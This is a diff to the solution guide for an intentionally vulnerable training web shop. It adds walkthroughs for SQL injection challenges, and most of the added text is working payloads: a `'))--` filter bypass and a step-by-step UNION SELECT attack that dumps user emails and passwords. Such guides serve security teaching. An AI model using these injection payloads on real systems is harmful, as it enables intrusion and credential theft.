@@ -286,11 +286,14 @@ order to exploit and solve them:
     ![SQL search query in Javascript error](img/search_error-js_console.png)
 3. Its `AND deletedAt IS NULL`-part is what is hiding the Christmas
    product we seek.
-4. Searching for `'))--` lists all products, including the (logically
-   deleted) Christmas offer.
-5. Add at least one _Christmas Super-Surprise-Box (2014 Edition)_ to
+4. Searching for `'--` results in a `SQLITE_ERROR: syntax error` on the
+   Javascript console. This is due to two (now unbalanced) parenthesis
+   in the query.
+5. Searching for `'))--` fixes the syntax and successfully lists all
+   products, including the (logically deleted) Christmas offer.
+6. Add at least one _Christmas Super-Surprise-Box (2014 Edition)_ to
    your shopping basket.
-6. Click _Checkout_ on the _Your Basket_ page to solve the challenge.
+7. Click _Checkout_ on the _Your Basket_ page to solve the challenge.
 
 ### Log in with Jim's user account
 
@@ -356,6 +359,64 @@ order to exploit and solve them:
     ![XSS3 alert box in product details](img/xss3_product-modal_alert.png)
 
 ### Retrieve a list of all user credentials via SQL Injection
+
+1. During the
+   [Order the Christmas special offer of 2014](#order-the-christmas-special-offer-of-2014)
+   challenge you learned that the _Search_ functionality is susceptible
+   to SQL Injection.
+2. The attack payload you need to craft is a `UNION SELECT` merging the
+   data from the user's DB table into the products shown in the _Search
+   Results_ table.
+3. As a starting point we use the known working `'))--` attack pattern
+   and try to make a `UNION SELECT` out of it
+4. Searching for `')) UNION SELECT * FROM x--` fails with a
+   `SQLITE_ERROR: no such table` as you would expect. But we can easily
+   guess the table name or infer it from one of the previous attacks on
+   the _Login_ form.
+5. Searching for `')) UNION SELECT * FROM Users--` fails with a
+   promising `SQLITE_ERROR: SELECTs to the left and right of UNION do
+   not have the same number of result columns` which least confirms the
+   table name.
+6. The next step in a `UNION SELECT`-attack is typically to find the
+   right number of returned columns. As the _Search Results_ table has 3
+   columns displaying data, it will at least be three. You keep adding
+   columns until no more `SQLITE_ERROR` occurs (or at least it becomes a
+   different one):
+    1. `')) UNION SELECT '1' FROM Users--` fails with `number of result
+       columns` error
+    2. `')) UNION SELECT '1', '2' FROM Users--` fails with `number of
+       result columns` error
+    3. `')) UNION SELECT '1', '2', '3' FROM Users--` fails with `number
+       of result columns` error
+    4. (...)
+    5. `')) UNION SELECT '1', '2', '3', '4', '5', '6', '7' FROM Users--`
+       _still fails_ with `number of result columns` error
+    6. `')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8' FROM
+       Users--` shows a _Search Result_ with an interesting extra row at
+       the bottom.
+
+        ![UNION SELECT attack with fixed columns](img/union_select-success.png)
+7. Next you get rid of the unwanted product results changing the query
+   into something like `qwert')) UNION SELECT '1', '2', '3', '4', '5',
+   '6', '7', '8' FROM Users--`
+
+    ![UNION SELECT cleaned attack result](img/union_select-no_products.png)
+8. The last step is to replace the _visible_ fixed values with correct
+   column names. You could guess those **or** derive them from the RESTful
+   API results **or** remember them from previously seen SQL errors while attacking the
+   _Login_ form.
+9. Searching for `qwert')) UNION SELECT '1', id, email, password, '5',
+                    '6', '7', '8' FROM Users--` solves the challenge giving you a the list of all user data.
+
+    ![User list from UNION SELECT attack](img/union_select-attack_result.png)
+
+> There is of course a much easier way to retrieve a list of all users
+> as long as you are logged in: Open
+> <http://localhost:3000/#/administration> while monitoring the HTTP
+> calls in your browser's developer tools. The response to
+> <http://localhost:3000/rest/user/authentication-details> contains all
+> the user data in JSON format. But: This does not involve SQL Injection
+> so it will not count as a solution for this challenge.
 
 ### Post some feedback in another users name
 
